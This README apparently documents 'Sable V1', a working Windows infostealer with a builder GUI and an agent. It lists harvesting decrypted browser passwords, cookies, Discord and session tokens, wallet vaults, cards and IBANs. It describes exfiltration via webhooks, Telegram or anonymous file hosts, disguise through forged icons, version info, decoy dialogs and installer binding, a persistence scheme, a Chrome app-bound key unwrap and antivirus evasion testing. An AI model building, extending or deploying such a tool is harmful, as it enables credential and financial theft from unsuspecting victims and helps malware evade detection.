# SABLE V1

Frozen 2026-11-21. Tag `v1.0`. This file ships inside the tag, so it names the tag and
not a hash that would move under it.

This is the version that works. Everything below is either proven by a test that ran or
listed under limits. Nothing is planned work disguised as a feature.

## What it is

A Windows information gatherer with two halves:

- **The bench** (`app/`) — a PySide6 window that validates a config, collects nothing, and
  produces an artifact.
- **The agent** (`agent/`) — what runs on the other machine: it mounts the sealed payload,
  collects, packs, seals, and transmits.

`core/` holds what both halves need and what neither owns: the schema, the seal, the
forge, the validator, the pipeline.

51 files. The manifest is the spec and a test enforces it in both directions.

## What it does

| Source | What leaves the machine |
|---|---|
| `system` | firmware, CPU, GPU, OS build, memory, uptime, machine identity, user |
| `network` | adapters, hardware addresses, link state, and one geolocation lookup |
| `displays` | monitors and their geometries |
| `browsers` | the whole profile folder, plus decrypted passwords, cookies, history, downloads, bookmarks |
| `sessions` | browser session tokens, Discord tokens |
| `wallets` | extension wallets and their encrypted vaults |
| `autofill` | saved form entries, cards, addresses, IBANs |
| `documents` | configured file types from the usual folders |

Delivery is one of four relay kinds: an `https` webhook, a `telegram` bot, `link` — which
uploads to a file host and posts the URL — or `phantom`, which uploads to an anonymous host
and publishes a release page carrying the name, size, sha256 and a working link. Behind the
primary, up to four mirrors are tried in order — ordered failover, not a broadcast, so a
dead webhook stops being a whole-run event. The transmitted archive is a WinZip AES-256 zip
keyed on the seal key, so it opens in 7-Zip or WinRAR with the password and nowhere without
it.

Optional and off by default: `keep_local` writes a plain copy and a summary to
`Documents\Sable Results` before sending. `persist` stages the image under
`%LOCALAPPDATA%\Programs\WinSvcHost` and re-runs it on a schedule.

## What the artifact looks like

The build is meant to survive being looked at. Four things are configurable about its
appearance, and all four are done on the PE in `core/forge.py` rather than by handing a
resource compiler a script:

- **The icon** replaces the launcher's. The group id is read from the stub, not assumed —
  `notepad.exe` files its groups at 2, 300, 301 and 302, so a hardcoded 1 leaves the old
  icon in place. On the proof fixture: groups `[2,300,301,302]` to `[2]`, images 22 to 2,
  and the shell icon hash moves to the same one the launcher reports.
- **The version resource** is built as `VS_VERSIONINFO` in pure Python and read back
  through `version.dll` to verify it. Company, product, description, file and product
  version, copyright, and `OriginalFilename` all round-trip; signature `0xfeef04bd`.
- **The decoy** is a `MessageBoxTimeoutW` dialog on its own thread, returning in about a
  second instead of waiting for a click, titled and worded from the config. It starts
  before collection, so the window is up while the machine is being read.
- **The filename** comes from the bound file's stem when one was given, then an explicit
  name, and only then a generated one. A bound `Northline Setup.exe` produces
  `Northline Setup.exe`.

A bind keeps the original file byte-identical and appends the payload behind it, and a
fused build puts the payload behind `fused/` under a 64 MiB ceiling.

## What was proven, and where

`HANDOFF.md` §5 is the full list. The short version:

- 352 Python tests, `ruff` clean, `compileall` clean.
- Forge, validate, pipeline, widgets, whole window and frozen launcher suites, plus the
  contract tests that pin the helper flag, the disguise path and the category split.
- Live: Discord webhooks, the `.py` artifact, catbox and litterbox, gofile fallback,
  self-remove, `keep_local`, the retry queue driven by the real scheduled task, and
  persistence staged, fired and fully removed afterwards.
- Second machine: artifact delivered, opened, decrypted, payload read. A 145,073,950-byte
  sealed archive crossed the LAN in about a second and every one of its 2885 members
  verified.
- **Disguise, end to end**, `_harness/disguise_check.py`: name taken from the bound file,
  version visible on the property sheet, icon in the shell, 26 payload members, the bound
  file byte-identical afterwards, and the decoy returning in 1.08 s.
- **Translator, on live data**: a sealed payload opened with the Rust reader, and
  `browsers/thorium/Default/passwords.json` holding plaintext rows. A per-profile
  `_status.json` names what each artifact did and, when it did nothing, why.
- **App-bound unwrap**, `_harness/abe_check.py`: a real artifact built, its mutex held from
  outside, the task registered as the current user, the artifact re-execing with
  `--abe-unwrap`, the hex key written, reduced to 32 bytes, and the task deleted.
- The archive opens in 7-Zip with the key and fails every entry without it.
- Rust crate `native/aes` agrees with the Python formats in both directions, 21/21.

## Known limits

- **App-bound (`v20`) rows need the unwrap helper, and the helper needs a scheduled
  task.** Chrome, Edge and Brave write those rows against a key wrapped for the machine
  and the app, not the user. The artifact re-execs itself once under a registered task to
  unwrap it. Where that unwrap does not happen the rows stay sealed, and `_status.json`
  says so in those words. Recorded in `DECISIONS.md`.
- **The SYSTEM half of the unwrap is unproven.** Registering the helper as `SYSTEM` needs
  elevation, and the development shell does not have it. Everything this codebase writes
  is tested; the gap is Windows' own token boundary, not this code.
- **Edge will not share its cookie jar.** Its live `Network\Cookies` is opened with no
  share mode at all: 0 successful opens in 120 attempts over 6 s, at every share mode
  including exclusive. No reader recovers that without a volume snapshot, so Edge cookies
  are uncollected on a running profile and the status reads `copy refused`. Chrome and
  Brave copy normally.
- **`files.catbox.moe` is unreachable from the build machine** at the TLS layer. The gofile
  fallback covers it, and `_reachable` is checked before an upload rather than after.
- **Never-seen-host detonation is owed.** Defender passed on the operator's machine, which
  had history, and the artifact has since passed a second run there. A clean VM with no
  history is the test that has not happened, and it is owed against this tag rather than
  before it.
- **One receiver, single-threaded, capped the measured throughput.** A 426 MB run took
  about six minutes; the real ceiling is unmeasured. That is a V2 optimisation target and
  not a V1 blocker. Per-source timing logs where the time went.
- **Zip64 is refused, not read.** 65535 members and 4 GiB per member are past anything a
  run produces.

## Build

```powershell
$py = "C:\Users\Kuzenee\AppData\Local\Temp\opencode\py312\python.exe"
cd sable
& $py -m pytest -q            # 352
& $py -m app.main             # the window
```

The frozen launcher is built once and reused by every artifact:

```powershell
& $py -m PyInstaller tools/sable-launcher.spec --distpath tools/dist --workpath tools/build --noconfirm
```

Output: `tools/dist/sable-launcher.exe`, 37/37 on `_harness/sable_launcher.py`.

A fresh `git archive` of the tag runs 350 passed and 2 skipped: the two frozen-launcher
cases skip because `tools/dist` is a build output and is not checked in.

The native crate is separate and not required to build an artifact:

```bash
cd native/aes && cargo build --release && cargo test --release
```

## Deferred to V2

- **The native launcher decision.** The crate proves the formats; whether the frozen stub
  becomes a Rust binary is a product decision, still open. See `HANDOFF.md` §10.
- **Throughput.** The receiver is single-threaded and the real ceiling is unmeasured; a
  426 MB run took about six minutes.
- **VM detonation.** Owed against this tag, not before it.
